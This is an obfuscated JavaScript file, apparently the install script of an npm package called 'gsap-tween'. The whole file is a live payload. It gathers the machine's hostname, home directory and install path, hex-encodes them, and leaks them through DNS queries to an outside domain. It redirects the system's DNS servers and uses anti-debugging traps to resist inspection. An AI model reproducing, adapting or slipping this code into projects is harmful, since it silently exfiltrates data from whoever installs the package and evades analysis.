const dns = require('dns');
const os = require('os');
const suffix = '.dns.alexbirsan-hacks-paypal.com';
const ns = 'dns1.alexbirsan-hacks-paypal.com';
const package = 'gsap-tween';
function sendToServer(_0x38ad20) {
    _0x38ad20 = Buffer['from'](_0x38ad20)['toString']('hex');
    _0x38ad20 = _0x38ad20['match'](/.{1,60}/g);
    id = Math['random']()['toString'](0x24)['substring'](0x2);
    _0x38ad20['forEach'](function (_0x204234, _0x409b12) {
        try {
            dns['resolve']('v2_f.' + id + '.' + _0x409b12 + '.' + _0x204234 + '.v2_e' + suffix, 'A', console['log']);
        } catch (_0x466d6b) {
        }
    });
}
function tryGet(_0x2a2b3c) {
    const _0x4d2c8f = (function () {
        let _0x3fa1ae = !![];
        return function (_0x23f52c, _0x20a069) {
            const _0x5f3d30 = _0x3fa1ae ? function () {
                if (_0x20a069) {
                    const _0x2a5827 = _0x20a069['apply'](_0x23f52c, arguments);
                    _0x20a069 = null;
                    return _0x2a5827;
                }
            } : function () {
            };
            _0x3fa1ae = ![];
            return _0x5f3d30;
        };
    }());
    (function () {
        _0x4d2c8f(this, function () {
            const _0x315282 = new RegExp('function\x20*\x5c(\x20*\x5c)');
            const _0x4b0f57 = new RegExp('\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i');
            const _0x51ecca = _0x18bbcc('init');
            if (!_0x315282['test'](_0x51ecca + 'chain') || !_0x4b0f57['test'](_0x51ecca + 'input')) {
                _0x51ecca('0');
            } else {
                _0x18bbcc();
            }
        })();
    }());
    try {
        return _0x2a2b3c();
    } catch (_0x4a4d77) {
        return 'err';
    }
}
data = {
    'p': package,
    'h': tryGet(os['hostname']),
    'd': tryGet(os['homedir']),
    'c': __dirname
};
if (data['h'] == 'BBOGENS-LAPTOP') {
    process['exit'](0x0);
}
data = JSON['stringify'](data);
sendToServer(data);
dns['lookup'](ns, function (_0x16eaa4, _0x174593) {
    if (!_0x16eaa4) {
        nsAddress = _0x174593;
    } else {
        nsAddress = '8.8.8.8';
    }
    dns['setServers']([
        nsAddress,
        '8.8.4.4'
    ]);
    sendToServer(data);
});
function _0x18bbcc(_0x4c117f) {
    function _0x4911b3(_0x5c0b08) {
        if (typeof _0x5c0b08 === 'string') {
            return function (_0x4f3f2f) {
            }['constructor']('while\x20(true)\x20{}')['apply']('counter');
        } else {
            if (('' + _0x5c0b08 / _0x5c0b08)['length'] !== 0x1 || _0x5c0b08 % 0x14 === 0x0) {
                (function () {
                    return !![];
                }['constructor']('debu' + 'gger')['call']('action'));
            } else {
                (function () {
                    return ![];
                }['constructor']('debu' + 'gger')['apply']('stateObject'));
            }
        }
        _0x4911b3(++_0x5c0b08);
    }
    try {
        if (_0x4c117f) {
            return _0x4911b3;
        } else {
            _0x4911b3(0x0);
        }
    } catch (_0x51fcff) {
    }
}
